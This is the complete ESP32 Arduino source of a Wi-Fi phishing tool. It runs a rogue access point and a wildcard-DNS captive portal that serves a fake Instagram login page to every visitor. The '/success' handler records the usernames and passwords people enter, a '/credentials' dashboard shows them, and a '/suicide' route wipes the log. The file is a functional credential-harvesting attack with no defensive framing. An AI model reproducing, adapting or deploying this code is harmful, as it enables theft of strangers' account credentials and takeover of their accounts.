#include "WiFi.h"
#include "ESPAsyncWebServer.h"
#include "SPIFFS.h"
#include <DNSServer.h>

String ap_ssid_str, ap_pass_str;

DNSServer dnsServer;
AsyncWebServer server(80);

String dashboardProcessor(const String& var) {
  if (var == "AP_NAME") {
    return ap_ssid_str;
  }
  if (var == "AP_PASS") {
    return ap_pass_str;
  }
  if (var == "LIST") {
    File credentials = SPIFFS.open("/creds.socx", "r");
    String creds = credentials.readString();
    return creds;
  }
  return String();
}


class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {
    server.on("/", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/instagram.html", String(), false, dashboardProcessor);
    });
    server.on("/instagram_style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/instagram_style.css", "text/css");
    });
    server.on("/dashboard", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/dashboard.html", String(), false, dashboardProcessor);
    });
    server.on("/credentials", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/credentials.html", String(), false, dashboardProcessor);
    });
    server.on("/suicide", HTTP_GET, [](AsyncWebServerRequest * request) {
      SPIFFS.remove("/creds.socx");
      request->redirect("/credentials");
    });
    server.on("/style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/style.css", "text/css");
    });
    server.on("/instagram.png", HTTP_GET, [](AsyncWebServerRequest * request) {
      request->send(SPIFFS, "/instagram.png", "image/png");
    });
    server.on("/success", HTTP_GET, [](AsyncWebServerRequest * request) {
      String user, pass;
      int paramsNr = request->params();
      for (int i = 0; i < paramsNr; i++) {
        AsyncWebParameter* p = request->getParam(i);
        if (p->name() == "username") {
          user = p->value();
        }
        if (p->name() == "password") {
          pass = p->value() + "<br><br>";
        }
      }
      File credentials = SPIFFS.open("/creds.socx", "a");
      String creds = "Username: " + user + " Password: " + pass;
      credentials.print(creds);
      credentials.close();
      request->send(SPIFFS, "/instagram_success.html", String(), false, dashboardProcessor);
    });
    server.on("/apply", HTTP_GET, [](AsyncWebServerRequest * request) {
      int paramsNr = request->params();
      for (int i = 0; i < paramsNr; i++) {
        AsyncWebParameter* p = request->getParam(i);
        if (p->name() == "ap_name") {
          ap_ssid_str = p->value() + "\n";
        }
        if (p->name() == "ap_pass") {
          ap_pass_str = p->value() + "\n";
        }
      }
      File settings = SPIFFS.open("/settings.socx", "w");
      settings.print(ap_ssid_str);
      settings.print(ap_pass_str);
      settings.close();
      request->redirect("/dashboard");
      delay(2000);
      ESP.restart();
    });
  }
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request){
    //request->addInterestingHeader("ANY");
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) {
    request->send(SPIFFS, "/instagram.html", String(), false, dashboardProcessor);  
  }
};

void setup() {
  Serial.begin(115200);
  SPIFFS.begin();
  if (SPIFFS.exists("/settings.socx")) {
    File settings = SPIFFS.open("/settings.socx", "r");
    int i = 0;
    char buffer[64];
    while (settings.available()) {
      int l = settings.readBytesUntil('\n', buffer, sizeof(buffer));
      buffer[l] = 0;
      if (i == 0) {
        ap_ssid_str = buffer;
      }
      if (i == 1) {
        ap_pass_str = buffer;
      }
      i++;
      if (i == 2) {
        break;
      }
    }
  } else {
    Serial.println("[Booting Failed] Settings file is missing!");
    ESP.deepSleep(0);
    return;
  }
  if (!WiFi.softAP(ap_ssid_str.c_str(), ap_pass_str.c_str())) {
    String backup_ap_ssid_str, backup_ap_pass_str;
    backup_ap_ssid_str = "BackupSocialX";
    backup_ap_pass_str = "";
    WiFi.softAP(backup_ap_ssid_str.c_str(), backup_ap_pass_str.c_str());
  }
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
}
